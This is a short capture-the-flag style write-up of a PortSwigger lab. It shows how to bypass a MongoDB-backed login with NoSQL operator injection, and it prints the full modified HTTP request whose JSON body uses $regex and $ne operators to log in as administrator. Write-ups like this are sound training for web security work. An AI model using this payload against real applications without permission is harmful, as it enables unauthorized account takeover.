---
tags:
  - nosql
---
# Exploiting NoSQL operator injection to bypass authentication

## Instructions

The login functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection using MongoDB operators.

To solve the lab, log into the application as the `administrator` user.

You can log in to your own account using the following credentials: `wiener:peter`.

## Solution

Try to log in with the username `administrator` and any password. Note that you get a failed login message. 

Send the login request to repeater.

Modify the request as follows:

```text title="Modified NoSQL request" hl_lines="19"
POST /login HTTP/1.1
Host: 0a6700540464fd65805b5d37000100ab.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Referer: https://0a6700540464fd65805b5d37000100ab.web-security-academy.net/login
Content-Type: application/json
Content-Length: 50
Origin: https://0a6700540464fd65805b5d37000100ab.web-security-academy.net
Connection: keep-alive
Cookie: session=yqgMFKE031qO9DBnRKYkECycybQTx1OG
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-PwnFox-Color: magenta
Priority: u=0

{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
```

This works and we're able to get into the admin account.

![](../../../../../site/_drafts/labs/PortSwigger/NoSQL-Injection/attachments/nosql-lab-2/file-20251124113610550.webp)

